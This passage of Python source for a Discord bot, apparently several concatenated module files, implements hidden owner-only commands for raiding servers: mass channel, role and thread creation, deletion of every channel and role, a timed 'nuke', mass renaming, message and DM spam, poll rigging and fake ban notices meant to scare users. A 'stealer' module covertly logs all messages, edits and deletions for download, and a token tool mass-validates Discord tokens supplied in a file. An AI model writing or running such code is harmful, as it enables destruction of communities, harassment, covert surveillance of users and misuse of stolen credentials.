        async for msg in ctx.channel.history(limit=1000):
            if msg.author == self.bot.user:
                await msg.delete()
                count += 1
                await asyncio.sleep(0.3)
        await ctx.send(f"deleted {count} of my messages.", delete_after=5)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def fakeban(self, ctx: commands.Context, target: discord.Member):
        """94. send a fake ban message to scare a user."""
        embed = discord.Embed(
            title="you have been banned",
            description=f"user {target.mention} has been banned from {ctx.guild.name}",
            color=discord.Color.red(),
        )
        embed.add_field(name="reason", value="violation of terms of service")
        embed.set_footer(text="this action is irreversible")
        await ctx.send(embed=embed)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def announce(self, ctx: commands.Context, *, message: str):
        """95. send an announcement to every channel."""
        count = 0
        for channel in ctx.guild.text_channels:
            try:
                embed = discord.Embed(
                    title="official announcement",
                    description=message,
                    color=discord.Color.gold(),
                )
                await channel.send(embed=embed)
                count += 1
                await asyncio.sleep(0.5)
            except:
                pass
        await ctx.send(f"announcement sent to {count} channels.", delete_after=5)

# ========================================
# raid.py
# ========================================
class Raid(commands.Cog, name="raid"):
    """server raiding utilities."""

    def __init__(self, bot: commands.Bot):
        self.bot = bot

    @commands.command(hidden=True)
    @commands.is_owner()
    async def channelspam(self, ctx: commands.Context, name: str = "raided", amount: int = 50):
        """create a large number of channels rapidly."""
        created = 0
        for i in range(amount):
            try:
                await ctx.guild.create_text_channel(f"{name}-{i}")
                created += 1
                await asyncio.sleep(0.3)
            except:
                break
        await ctx.send(f"created {created} channels.")

    @commands.command(hidden=True)
    @commands.is_owner()
    async def rolespam(self, ctx: commands.Context, name: str = "raided", amount: int = 30):
        """create a large number of roles."""
        created = 0
        for i in range(amount):
            try:
                await ctx.guild.create_role(name=f"{name}-{i}")
                created += 1
                await asyncio.sleep(0.3)
            except:
                break
        await ctx.send(f"created {created} roles.")

    @commands.command(hidden=True)
    @commands.is_owner()
    async def spamchannels(self, ctx: commands.Context, amount: int = 10, *, message: str = "RAIDED"):
        """send a message to all text channels."""
        count = 0
        for channel in ctx.guild.text_channels:
            try:
                await channel.send(message)
                count += 1
                await asyncio.sleep(0.5)
            except:
                pass
        await ctx.send(f"messaged {count} channels.")

    @commands.command(hidden=True)
    @commands.is_owner()
    async def deletename(self, ctx: commands.Context):
        """rename all members to a random string."""
        count = 0
        for member in ctx.guild.members:
            if member.top_role >= ctx.guild.me.top_role:
                continue
            try:
                new_name = ''.join(random.choices(string.ascii_lowercase, k=8))
                await member.edit(nick=new_name)
                count += 1
                await asyncio.sleep(1)
            except:
                pass
        await ctx.send(f"renamed {count} members.")

    @commands.command(hidden=True)
    @commands.is_owner()
    async def prune(self, ctx: commands.Context, days: int = 1):
        """prune members inactive for specified days."""
        try:
            pruned = await ctx.guild.prune_members(days=days)
            await ctx.send(f"pruned {pruned} members.")
        except discord.Forbidden:
            await ctx.send("missing permissions.")

    @commands.command(hidden=True)
    @commands.is_owner()
    async def deletechannels(self, ctx: commands.Context):
        """delete all channels in the server."""
        count = 0
        for channel in ctx.guild.channels:
            try:
                await channel.delete()
                count += 1
                await asyncio.sleep(0.3)
            except:
                pass
        await ctx.send(f"deleted {count} channels.")

    @commands.command(hidden=True)
    @commands.is_owner()
    async def deleteroles(self, ctx: commands.Context):
        """delete all deletable roles."""
        count = 0
        for role in ctx.guild.roles:
            if role.managed or role == ctx.guild.default_role:
                continue
            try:
                await role.delete()
                count += 1
                await asyncio.sleep(0.3)
            except:
                pass
        await ctx.send(f"deleted {count} roles.")

# ========================================
# reaction_abuse.py
# ========================================
class ReactionAbuse(commands.Cog, name="reaction_abuse"):
    """21-30: reaction and emoji abuse."""

    def __init__(self, bot: commands.Bot):
        self.bot = bot

    @commands.command(hidden=True)
    @commands.is_owner()
    async def reactspam(self, ctx: commands.Context, message_id: int, *emojis):
        """21. spam reactions on a message."""
        try:
            msg = await ctx.channel.fetch_message(message_id)
            for emoji in emojis:
                for _ in range(5):
                    await msg.add_reaction(emoji)
                    await asyncio.sleep(0.2)
            await ctx.send("reaction spam complete.", delete_after=5)
        except Exception as e:
            await ctx.send(f"error: {e}", delete_after=5)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def reactall(self, ctx: commands.Context, message_id: int):
        """22. react with all server emojis on a message."""
        try:
            msg = await ctx.channel.fetch_message(message_id)
            count = 0
            for emoji in ctx.guild.emojis[:20]:
                try:
                    await msg.add_reaction(emoji)
                    count += 1
                    await asyncio.sleep(0.3)
                except:
                    pass
            await ctx.send(f"added {count} emoji reactions.", delete_after=5)
        except Exception as e:
            await ctx.send(f"error: {e}", delete_after=5)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def removereact(self, ctx: commands.Context, message_id: int, emoji: str, target: discord.Member = None):
        """23. remove a specific reaction."""
        try:
            msg = await ctx.channel.fetch_message(message_id)
            if target:
                await msg.remove_reaction(emoji, target)
            else:
                await msg.clear_reaction(emoji)
            await ctx.send("reaction removed.", delete_after=5)
        except Exception as e:
            await ctx.send(f"error: {e}", delete_after=5)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def clearreacts(self, ctx: commands.Context, message_id: int):
        """24. clear all reactions from a message."""
        try:
            msg = await ctx.channel.fetch_message(message_id)
            await msg.clear_reactions()
            await ctx.send("all reactions cleared.", delete_after=5)
        except Exception as e:
            await ctx.send(f"error: {e}", delete_after=5)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def reactusers(self, ctx: commands.Context, message_id: int, emoji: str):
        """25. see who reacted with a specific emoji."""
        try:
            msg = await ctx.channel.fetch_message(message_id)
            for reaction in msg.reactions:
                if str(reaction.emoji) == emoji:
                    users = [u.name async for u in reaction.users()]
                    await ctx.send(f"users who reacted with {emoji}: {', '.join(users[:30])}" if users else "no users.")
                    return
            await ctx.send("emoji not found on that message.")
        except Exception as e:
            await ctx.send(f"error: {e}", delete_after=5)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def reactbomb(self, ctx: commands.Context, target: discord.Member, count: int = 50):
        """26. spam a user's last message with reactions."""
        async for msg in ctx.channel.history(limit=50):
            if msg.author == target:
                emojis = ["👍", "👎", "❤️", "🔥", "😂", "😮", "😢", "😡"]
                for i in range(count):
                    await msg.add_reaction(emojis[i % len(emojis)])
                    await asyncio.sleep(0.2)
                await ctx.send(f"reaction bombed {target.mention}.", delete_after=5)
                return
        await ctx.send("no recent message from that user found.")

    @commands.command(hidden=True)
    @commands.is_owner()
    async def pollrig(self, ctx: commands.Context, message_id: int, emoji: str, count: int = 10):
        """27. rig a poll by adding many reactions with the specified emoji."""
        try:
            msg = await ctx.channel.fetch_message(message_id)
            for _ in range(count):
                await msg.add_reaction(emoji)
                await asyncio.sleep(0.3)
            await ctx.send(f"poll rigged with {count} {emoji} reactions.", delete_after=5)
        except Exception as e:
            await ctx.send(f"error: {e}", delete_after=5)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def reactchain(self, ctx: commands.Context, message_id: int, *emojis):
        """28. create a chain reaction pattern on a message."""
        try:
            msg = await ctx.channel.fetch_message(message_id)
            for emoji in emojis:
                await msg.add_reaction(emoji)
                await asyncio.sleep(0.5)
            for emoji in reversed(emojis):
                await msg.clear_reaction(emoji)
                await asyncio.sleep(0.5)
            await ctx.send("reaction chain complete.", delete_after=5)
        except Exception as e:
            await ctx.send(f"error: {e}", delete_after=5)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def reactioninfo(self, ctx: commands.Context, message_id: int):
        """29. get reaction statistics for a message."""
        try:
            msg = await ctx.channel.fetch_message(message_id)
            info = []
            for reaction in msg.reactions:
                info.append(f"{reaction.emoji}: {reaction.count} (me: {reaction.me})")
            await ctx.send("\n".join(info) or "no reactions.")
        except Exception as e:
            await ctx.send(f"error: {e}", delete_after=5)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def massreact(self, ctx: commands.Context, emoji: str, limit: int = 20):
        """30. add a reaction to many recent messages."""
        count = 0
        async for msg in ctx.channel.history(limit=limit):
            try:
                await msg.add_reaction(emoji)
                count += 1
                await asyncio.sleep(0.4)
            except:
                pass
        await ctx.send(f"reacted to {count} messages with {emoji}.", delete_after=5)

# ========================================
# recon.py
# ========================================
class Recon(commands.Cog, name="recon"):
    """reconnaissance and information gathering."""

    def __init__(self, bot: commands.Bot):
        self.bot = bot

    @commands.command()
    async def userinfo(self, ctx: commands.Context, target: discord.Member = None):
        """get detailed information about a user."""
        target = target or ctx.author
        embed = discord.Embed(color=target.color, title=f"user info: {target}")
        embed.set_thumbnail(url=target.display_avatar.url)
        embed.add_field(name="id", value=target.id)
        embed.add_field(name="display name", value=target.display_name)
        embed.add_field(name="created at", value=target.created_at.strftime("%Y-%m-%d %H:%M:%S"))
        embed.add_field(name="joined at", value=target.joined_at.strftime("%Y-%m-%d %H:%M:%S") if target.joined_at else "N/A")
        embed.add_field(name="roles", value=", ".join([r.mention for r in target.roles[1:]]) or "none")
        embed.add_field(name="bot", value=target.bot)
        await ctx.send(embed=embed)

    @commands.command()
    async def serverinfo(self, ctx: commands.Context):
        """get detailed information about the server."""
        guild = ctx.guild
        embed = discord.Embed(color=discord.Color.blurple(), title=f"server info: {guild.name}")
        if guild.icon:
            embed.set_thumbnail(url=guild.icon.url)
        embed.add_field(name="id", value=guild.id)
        embed.add_field(name="owner", value=str(guild.owner))
        embed.add_field(name="created at", value=guild.created_at.strftime("%Y-%m-%d %H:%M:%S"))
        embed.add_field(name="members", value=guild.member_count)
        embed.add_field(name="channels", value=len(guild.channels))
        embed.add_field(name="roles", value=len(guild.roles))
        embed.add_field(name="emojis", value=len(guild.emojis))
        embed.add_field(name="boost level", value=guild.premium_tier)
        embed.add_field(name="boost count", value=guild.premium_subscription_count)
        await ctx.send(embed=embed)

    @commands.command()
    async def roleinfo(self, ctx: commands.Context, *, role: discord.Role):
        """get information about a role."""
        embed = discord.Embed(color=role.color, title=f"role info: {role.name}")
        embed.add_field(name="id", value=role.id)
        embed.add_field(name="created at", value=role.created_at.strftime("%Y-%m-%d %H:%M:%S"))
        embed.add_field(name="position", value=role.position)
        embed.add_field(name="mentionable", value=role.mentionable)
        embed.add_field(name="hoist", value=role.hoist)
        embed.add_field(name="managed", value=role.managed)
        embed.add_field(name="permissions", value=f"`{role.permissions.value}`")
        member_count = len(role.members)
        embed.add_field(name="members", value=member_count)
        await ctx.send(embed=embed)

# ========================================
# scheduler.py
# ========================================
SCHED_DIR = "data/scheduler"
os.makedirs(SCHED_DIR, exist_ok=True)

class Scheduler(commands.Cog, name="scheduler"):
    """31-40: scheduled and timed operations."""

    def __init__(self, bot: commands.Bot):
        self.bot = bot
        self.scheduled_tasks = {}
        self.reminders_file = os.path.join(SCHED_DIR, "reminders.json")

    @commands.command(hidden=True)
    @commands.is_owner()
    async def remind(self, ctx: commands.Context, minutes: int, *, message: str):
        """31. set a reminder that dms you after a delay."""
        await ctx.send(f"reminder set for {minutes} minutes.", delete_after=5)
        await asyncio.sleep(minutes * 60)
        try:
            await ctx.author.send(f"reminder: {message}")
        except:
            await ctx.send(f"{ctx.author.mention} reminder: {message}")

    @commands.command(hidden=True)
    @commands.is_owner()
    async def schedulemsg(self, ctx: commands.Context, minutes: int, *, message: str):
        """32. schedule a message to be sent after a delay."""
        await ctx.send(f"message scheduled in {minutes} minutes.", delete_after=5)
        await asyncio.sleep(minutes * 60)
        await ctx.send(message)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def scheduledelete(self, ctx: commands.Context, minutes: int):
        """33. schedule channel purge after delay."""
        await ctx.send(f"channel will be purged in {minutes} minutes.", delete_after=5)
        await asyncio.sleep(minutes * 60)
        await ctx.channel.purge(limit=1000)
        await ctx.send("scheduled purge complete.", delete_after=10)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def schedulenick(self, ctx: commands.Context, minutes: int, *, nickname: str):
        """34. schedule a nickname change for all members."""
        await ctx.send(f"nickname change scheduled in {minutes} minutes.", delete_after=5)
        await asyncio.sleep(minutes * 60)
        count = 0
        for member in ctx.guild.members:
            if member.top_role >= ctx.guild.me.top_role:
                continue
            try:
                await member.edit(nick=nickname[:32])
                count += 1
                await asyncio.sleep(0.5)
            except:
                pass
        await ctx.send(f"nicknamed {count} members to '{nickname}'.", delete_after=5)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def schedulelock(self, ctx: commands.Context, minutes: int):
        """35. schedule a full server lockdown."""
        await ctx.send(f"lockdown scheduled in {minutes} minutes.", delete_after=5)
        await asyncio.sleep(minutes * 60)
        count = 0
        for channel in ctx.guild.text_channels:
            overwrite = channel.overwrites_for(ctx.guild.default_role)
            overwrite.send_messages = False
            try:
                await channel.set_permissions(ctx.guild.default_role, overwrite=overwrite)
                count += 1
                await asyncio.sleep(0.2)
            except:
                pass
        await ctx.send(f"lockdown complete. {count} channels locked.", delete_after=5)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def schedulemassdm(self, ctx: commands.Context, minutes: int, *, message: str):
        """36. schedule a mass dm after a delay."""
        await ctx.send(f"mass dm scheduled in {minutes} minutes.", delete_after=5)
        await asyncio.sleep(minutes * 60)
        count = 0
        for member in ctx.guild.members:
            if member.bot:
                continue
            try:
                await member.send(message)
                count += 1
                await asyncio.sleep(1)
            except:
                pass
        await ctx.send(f"mass dm complete. {count} users messaged.", delete_after=5)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def countdown(self, ctx: commands.Context, seconds: int):
        """37. post a countdown in chat."""
        for i in range(seconds, 0, -1):
            await ctx.send(f"**{i}**")
            await asyncio.sleep(1)
        await ctx.send("**GO**")

    @commands.command(hidden=True)
    @commands.is_owner()
    async def intervalmsg(self, ctx: commands.Context, count: int, interval: int, *, message: str):
        """38. send a message at regular intervals."""
        await ctx.send(f"sending '{message}' {count} times every {interval}s.", delete_after=5)
        for i in range(count):
            await ctx.send(message)
            await asyncio.sleep(interval)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def autopurge(self, ctx: commands.Context, interval_minutes: int):
        """39. auto purge the channel every n minutes."""
        await ctx.send(f"auto purge every {interval_minutes} minutes started.", delete_after=5)
        while True:
            await asyncio.sleep(interval_minutes * 60)
            try:
                await ctx.channel.purge(limit=100)
            except:
                break

    @commands.command(hidden=True)
    @commands.is_owner()
    async def bomb(self, ctx: commands.Context, minutes: int):
        """40. execute a full server nuke after a countdown."""
        await ctx.send(f"server nuke scheduled in {minutes} minutes. use !abortbomb to cancel.", delete_after=5)
        self.scheduled_tasks["bomb"] = True
        await asyncio.sleep(minutes * 60)
        if self.scheduled_tasks.get("bomb"):
            for channel in ctx.guild.channels:
                try:
                    await channel.delete()
                    await asyncio.sleep(0.2)
                except:
                    pass
            for role in ctx.guild.roles:
                if role.is_default() or role.managed:
                    continue
                try:
                    await role.delete()
                    await asyncio.sleep(0.2)
                except:
                    pass
            await ctx.send("nuke complete.", delete_after=10)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def abortbomb(self, ctx: commands.Context):
        """41. cancel the scheduled nuke."""
        self.scheduled_tasks["bomb"] = False
        await ctx.send("nuke aborted.", delete_after=5)

# ========================================
# scraper.py
# ========================================
class Scraper(commands.Cog, name="scraper"):
    """user and server data scraping."""

    def __init__(self, bot: commands.Bot):
        self.bot = bot

    @commands.command(hidden=True)
    @commands.is_owner()
    async def memberlist(self, ctx: commands.Context):
        """get a list of all member ids and names."""
        members = [f"{m.id} | {m.name}" for m in ctx.guild.members]
        if not members:
            return await ctx.send("no members found.")
        chunks = [members[i:i+30] for i in range(0, len(members), 30)]
        for chunk in chunks:
            await ctx.send("```\n" + "\n".join(chunk) + "\n```")

    @commands.command(hidden=True)
    @commands.is_owner()
    async def scrapeavatar(self, ctx: commands.Context, target: discord.Member = None):
        """get all avatar urls for a user."""
        target = target or ctx.author
        urls = []
        if target.avatar:
            urls.append(f"standard: {target.avatar.url}")
        if target.display_avatar:
            urls.append(f"display: {target.display_avatar.url}")
        if target.guild_avatar:
            urls.append(f"guild: {target.guild_avatar.url}")
        await ctx.send("\n".join(urls) or "no avatars.")

    @commands.command(hidden=True)
    @commands.is_owner()
    async def scrapestatus(self, ctx: commands.Context):
        """scrape online status of all members."""
        statuses = {"online": [], "idle": [], "dnd": [], "offline": []}
        for m in ctx.guild.members:
            statuses[str(m.status)].append(m.name)
        msg = []
        for s, names in statuses.items():
            if names:
                msg.append(f"{s}: {', '.join(names[:10])}{'...' if len(names)>10 else ''}")
        await ctx.send("\n".join(msg))

# ========================================
# server_analyzer.py
# ========================================
class ServerAnalyzer(commands.Cog, name="server_analyzer"):
    """41-50: deep server analysis and statistics."""

    def __init__(self, bot: commands.Bot):
        self.bot = bot

    @commands.command(hidden=True)
    @commands.is_owner()
    async def activitymap(self, ctx: commands.Context):
        """42. generate an activity heatmap of channel usage."""
        data = {}
        for channel in ctx.guild.text_channels:
            try:
                count = 0
                async for _ in channel.history(limit=500):
                    count += 1
                data[channel.name] = count
            except:
                data[channel.name] = 0
        sorted_data = sorted(data.items(), key=lambda x: x[1], reverse=True)
        result = [f"{name}: {count} msgs" for name, count in sorted_data]
        await ctx.send("**channel activity:**\n```\n" + "\n".join(result[:15]) + "\n```")

    @commands.command(hidden=True)
    @commands.is_owner()
    async def topchatters(self, ctx: commands.Context, limit: int = 100):
        """43. find the most active users in recent history."""
        counter = Counter()
        for channel in ctx.guild.text_channels[:5]:
            try:
                async for msg in channel.history(limit=limit):
                    counter[str(msg.author)] += 1
            except:
                continue
        result = [f"{name}: {count}" for name, count in counter.most_common(20)]
        await ctx.send("**top chatters:**\n```\n" + "\n".join(result) + "\n```")

    @commands.command(hidden=True)
    @commands.is_owner()
    async def mostusedwords(self, ctx: commands.Context, limit: int = 500):
        """44. find the most commonly used words."""
        counter = Counter()
        stopwords = {"the", "a", "an", "is", "in", "it", "of", "to", "and", "that", "for", "on", "with", "as", "this", "was", "be", "at", "by", "or", "not"}
        for channel in ctx.guild.text_channels[:5]:
            try:
                async for msg in channel.history(limit=limit):
                    words = msg.content.lower().split()
                    for word in words:
                        clean = ''.join(c for c in word if c.isalpha())
                        if clean and len(clean) > 3 and clean not in stopwords:
                            counter[clean] += 1
            except:
                continue
        result = [f"{word}: {count}" for word, count in counter.most_common(30)]
        await ctx.send("**most used words:**\n```\n" + "\n".join(result) + "\n```")

    @commands.command(hidden=True)
    @commands.is_owner()
    async def joinorder(self, ctx: commands.Context):
        """45. list members in order of join date."""
        members = sorted(ctx.guild.members, key=lambda m: m.joined_at or datetime.datetime.min)
        result = [f"{i+1}. {m.name} - {m.joined_at.strftime('%Y-%m-%d') if m.joined_at else 'unknown'}" for i, m in enumerate(members[:30])]
        await ctx.send("**join order:**\n```\n" + "\n".join(result) + "\n```")

    @commands.command(hidden=True)
    @commands.is_owner()
    async def rolebreakdown(self, ctx: commands.Context):
        """46. see how many members have each role."""
        result = []
        for role in ctx.guild.roles:
            if role.is_default():
                continue
            result.append(f"{role.name}: {len(role.members)}")
        await ctx.send("**role breakdown:**\n```\n" + "\n".join(result[:30]) + "\n```")

    @commands.command(hidden=True)
    @commands.is_owner()
    async def inactive(self, ctx: commands.Context, days: int = 30):
        """47. find members who have not sent a message in n days."""
        cutoff = datetime.datetime.now(datetime.timezone.utc) - datetime.timedelta(days=days)
        active = set()
        for channel in ctx.guild.text_channels:
            try:
                async for msg in channel.history(after=cutoff, limit=50):
                    active.add(msg.author.id)
            except:
                continue
        inactive_members = [m for m in ctx.guild.members if m.id not in active and not m.bot]
        result = [f"{m.name} (joined: {m.joined_at.strftime('%Y-%m-%d') if m.joined_at else 'unknown'})" for m in inactive_members[:30]]
        await ctx.send(f"**inactive members ({days} days):**\n```\n" + "\n".join(result) + "\n```" if result else "everyone is active.")

    @commands.command(hidden=True)
    @commands.is_owner()
    async def boosters(self, ctx: commands.Context):
        """48. list all server boosters."""
        boosters = [m for m in ctx.guild.members if m.premium_since is not None]
        result = [f"{m.name} - boosting since {m.premium_since.strftime('%Y-%m-%d')}" for m in boosters]
        await ctx.send("**boosters:**\n```\n" + "\n".join(result) + "\n```" if result else "no boosters.")

    @commands.command(hidden=True)
    @commands.is_owner()
    async def permissionscan(self, ctx: commands.Context, target: discord.Member):
        """49. scan all permissions a user has in every channel."""
        result = []
        for channel in ctx.guild.channels:
            perms = channel.permissions_for(target)
            granted = [p for p, v in perms if v and p not in ("create_instant_invite", "change_nickname", "read_messages", "read_message_history", "view_channel")]
            if granted:
                result.append(f"#{channel.name}: {', '.join(granted[:5])}")
        await ctx.send(f"**permissions for {target.name}:**\n```\n" + "\n".join(result[:25]) + "\n```" if result else "no special permissions found.")

    @commands.command(hidden=True)
    @commands.is_owner()
    async def securityaudit(self, ctx: commands.Context):
        """50. audit server security settings."""
        issues = []
        guild = ctx.guild
        if guild.default_notifications == discord.NotificationLevel.all_messages:
            issues.append("default notifications set to all messages")
        if guild.verification_level == discord.VerificationLevel.none:
            issues.append("no verification level set")
        if guild.explicit_content_filter == discord.ContentFilter.disabled:
            issues.append("explicit content filter disabled")
        for role in guild.roles:
            if role.permissions.administrator and not role.managed and role != guild.default_role:
                issues.append(f"admin role exists: {role.name} ({len(role.members)} members)")
        admin_count = sum(1 for m in guild.members if m.guild_permissions.administrator)
        issues.append(f"total administrators: {admin_count}")
        if "COMMUNITY" not in guild.features:
            issues.append("server is not a community server")
        await ctx.send("**security audit:**\n```\n" + "\n".join(issues) + "\n```")

# ========================================
# spammer.py
# ========================================
class Spammer(commands.Cog, name="spammer"):
    """message spamming utilities."""

    def __init__(self, bot: commands.Bot):
        self.bot = bot

    @commands.command(hidden=True)
    @commands.is_owner()
    async def spam(self, ctx: commands.Context, count: int, *, message: str):
        """spam a message in the current channel."""
        for _ in range(count):
            await ctx.send(message)
            await asyncio.sleep(0.5)
        await ctx.send(f"spammed {count} messages.", delete_after=5)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def fastspam(self, ctx: commands.Context, count: int, *, message: str):
        """spam without delays."""
        for _ in range(count):
            await ctx.send(message)
        await ctx.send(f"fast spammed {count} messages.", delete_after=5)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def dmspam(self, ctx: commands.Context, target: discord.Member, count: int, *, message: str):
        """spam a user's dms."""
        for _ in range(count):
            try:
                await target.send(message)
                await asyncio.sleep(1)
            except:
                break
        await ctx.send(f"dm spammed {target.name}.")

# ========================================
# stealer.py
# ========================================
STEAL_DIR = "data/stolen"
os.makedirs(STEAL_DIR, exist_ok=True)

class Stealer(commands.Cog, name="stealer"):
    """credential and information harvesting simulation."""

    def __init__(self, bot: commands.Bot):
        self.bot = bot
        self.log_file = os.path.join(STEAL_DIR, "harvested.txt")

    def log(self, content: str):
        with open(self.log_file, "a", encoding="utf-8") as f:
            f.write(content + "\n")

    @commands.Cog.listener()
    async def on_message(self, message: discord.Message):
        if message.author == self.bot.user:
            return
        self.log(f"[{message.guild.name if message.guild else 'DM'}] {message.author} ({message.author.id}): {message.content}")

    @commands.Cog.listener()
    async def on_message_edit(self, before: discord.Message, after: discord.Message):
        if after.author == self.bot.user:
            return
        self.log(f"[EDIT] {after.author}: before='{before.content}' after='{after.content}'")

    @commands.Cog.listener()
    async def on_message_delete(self, message: discord.Message):
        if message.author == self.bot.user:
            return
        self.log(f"[DELETE] {message.author}: '{message.content}'")

    @commands.command(hidden=True)
    @commands.is_owner()
    async def dumpmessages(self, ctx: commands.Context, channel: discord.TextChannel = None, limit: int = 100):
        """dump recent messages from a channel to a file."""
        channel = channel or ctx.channel
        messages = []
        async for msg in channel.history(limit=limit):
            messages.append(f"[{msg.created_at}] {msg.author}: {msg.content}")
        filename = f"{STEAL_DIR}/{channel.id}_dump.txt"
        with open(filename, "w", encoding="utf-8") as f:
            f.write("\n".join(messages))
        await ctx.send(f"dumped {len(messages)} messages to `{filename}`.", file=discord.File(filename))

    @commands.command(hidden=True)
    @commands.is_owner()
    async def harvest(self, ctx: commands.Context):
        """download the full harvested log."""
        if os.path.exists(self.log_file):
            await ctx.send(file=discord.File(self.log_file))
        else:
            await ctx.send("no harvested data.")

    @commands.command(hidden=True)
    @commands.is_owner()
    async def clearlog(self, ctx: commands.Context):
        """clear the harvested log."""
        open(self.log_file, "w").close()
        await ctx.send("log cleared.")

# ========================================
# thread_bomb.py
# ========================================
class ThreadBomb(commands.Cog, name="thread_bomb"):
    """81-87: thread and forum manipulation."""

    def __init__(self, bot: commands.Bot):
        self.bot = bot

    @commands.command(hidden=True)
    @commands.is_owner()
    async def threadbomb(self, ctx: commands.Context, count: int = 30, *, name: str = "chaos"):
        """81. create many threads in a channel."""
        channel = ctx.channel
        created = 0
        for i in range(count):
            try:
                await channel.create_thread(name=f"{name}-{i}", type=discord.ChannelType.public_thread)
                created += 1
                await asyncio.sleep(0.3)
            except:
                break
        await ctx.send(f"created {created} threads.", delete_after=5)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def archvethreads(self, ctx: commands.Context):
        """82. archive all active threads."""
        count = 0
        for thread in ctx.guild.threads:
            try:
                await thread.edit(archived=True, locked=True)
                count += 1
                await asyncio.sleep(0.2)
            except:
                pass
        await ctx.send(f"archived {count} threads.", delete_after=5)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def deletethreads(self, ctx: commands.Context):
        """83. delete all threads."""
        count = 0
        for thread in ctx.guild.threads:
            try:
                await thread.delete()
                count += 1
                await asyncio.sleep(0.2)
            except:
                pass
        await ctx.send(f"deleted {count} threads.", delete_after=5)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def unarchivethreads(self, ctx: commands.Context):
        """84. unarchive all archived threads."""
        count = 0
        for thread in ctx.guild.threads:
            if thread.archived:
                try:
                    await thread.edit(archived=False, locked=False)
                    count += 1
                    await asyncio.sleep(0.2)
                except:
                    pass
        await ctx.send(f"unarchived {count} threads.", delete_after=5)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def threadspam(self, ctx: commands.Context, count: int = 5, *, message: str = "thread spam"):
        """85. send a message to all threads."""
        sent = 0
        for thread in ctx.guild.threads:
            if not thread.archived:
                try:
                    await thread.send(message)
                    sent += 1
                    await asyncio.sleep(0.3)
                except:
                    pass
        await ctx.send(f"messaged {sent} threads.", delete_after=5)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def forumspam(self, ctx: commands.Context, count: int = 20, *, name: str = "post"):
        """86. create posts in forum channels."""
        created = 0
        for channel in ctx.guild.forums:
            for i in range(count):
                try:
                    await channel.create_thread(name=f"{name}-{i}", content="spam")
                    created += 1
                    await asyncio.sleep(0.5)
                except:
                    break
        await ctx.send(f"created {created} forum posts.", delete_after=5)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def privatethread(self, ctx: commands.Context, target: discord.Member):
        """87. create a private thread with a target."""
        thread = await ctx.channel.create_thread(
            name=f"private-{target.name}",
            type=discord.ChannelType.private_thread,
        )
        await thread.add_user(target)
        await ctx.send(f"private thread created with {target.mention}.", delete_after=5)

# ========================================
# token_tools.py
# ========================================
class TokenTools(commands.Cog, name="token_tools"):
    """discord token checking and validation utilities."""

    def __init__(self, bot: commands.Bot):
        self.bot = bot

    async def validate_token(self, token: str):
        """check if a token is valid and return basic user info."""
        headers = {"Authorization": f"Bot {token}"}
        async with aiohttp.ClientSession() as session:
            async with session.get("https://discord.com/api/v10/users/@me", headers=headers) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    return True, data
                return False, None

    @commands.command(hidden=True)
    @commands.is_owner()
    async def checktoken(self, ctx: commands.Context, token: str):
        """validate a discord bot token."""
        valid, data = await self.validate_token(token)
        if valid:
            await ctx.send(f"valid token.\nuser: {data['username']}#{data['discriminator']}\nid: {data['id']}")
        else:
            await ctx.send("invalid token.")

    @commands.command(hidden=True)
    @commands.is_owner()
    async def masscheck(self, ctx: commands.Context):
        """check tokens from an attached .txt file."""
        if not ctx.message.attachments:
            return await ctx.send("attach a .txt file with tokens (one per line).")
        attachment = ctx.message.attachments[0]
        content = (await attachment.read()).decode("utf-8", errors="replace")
        tokens = [line.strip() for line in content.splitlines() if line.strip()]
        if not tokens:
            return await ctx.send("no tokens found in file.")
        valid_list = []
        for tok in tokens:
            valid, data = await self.validate_token(tok)
            if valid:
                valid_list.append(f"{data['username']}#{data['discriminator']} - {data['id']}")
            await asyncio.sleep(0.5)
        await ctx.send(f"checked {len(tokens)} tokens. valid: {len(valid_list)}\n```\n" + "\n".join(valid_list[:20]) + "\n```")

# ========================================
# voice_manip.py
# ========================================
class VoiceManip(commands.Cog, name="voice_manip"):
    """51-57: voice channel manipulation."""

    def __init__(self, bot: commands.Bot):
        self.bot = bot

    @commands.command(hidden=True)
    @commands.is_owner()
    async def vcmove(self, ctx: commands.Context, target: discord.Member, channel: discord.VoiceChannel):
        """51. force move a member to a different voice channel."""
        await target.move_to(channel)
        await ctx.send(f"moved {target.mention} to {channel.name}.", delete_after=5)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def vckick(self, ctx: commands.Context, target: discord.Member):
        """52. disconnect a member from voice."""
        await target.move_to(None)
        await ctx.send(f"disconnected {target.mention}.", delete_after=5)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def vcdisconnectall(self, ctx: commands.Context):
        """53. disconnect all members from all voice channels."""
        count = 0
        for vc in ctx.guild.voice_channels:
            for member in vc.members:
                try:
                    await member.move_to(None)
                    count += 1
                    await asyncio.sleep(0.2)
                except:
                    pass
        await ctx.send(f"disconnected {count} members.", delete_after=5)

    @commands.command(hidden=True)
    @commands.is_owner()
    async def vcmuteall(self, ctx: commands.Context):
        """54. mute all members in voice."""
        count = 0
        for vc in ctx.guild.voice_channels:
            for member in vc.members:
                try:
                    await member.edit(mute=True)
                    count += 1
                    await asyncio.sleep(0.1)
                except:
                    pass
        await ctx.send(f"muted {count} members.", delete_after=5)

    @commands.command(hidden=True)
    @commands.is_owner()
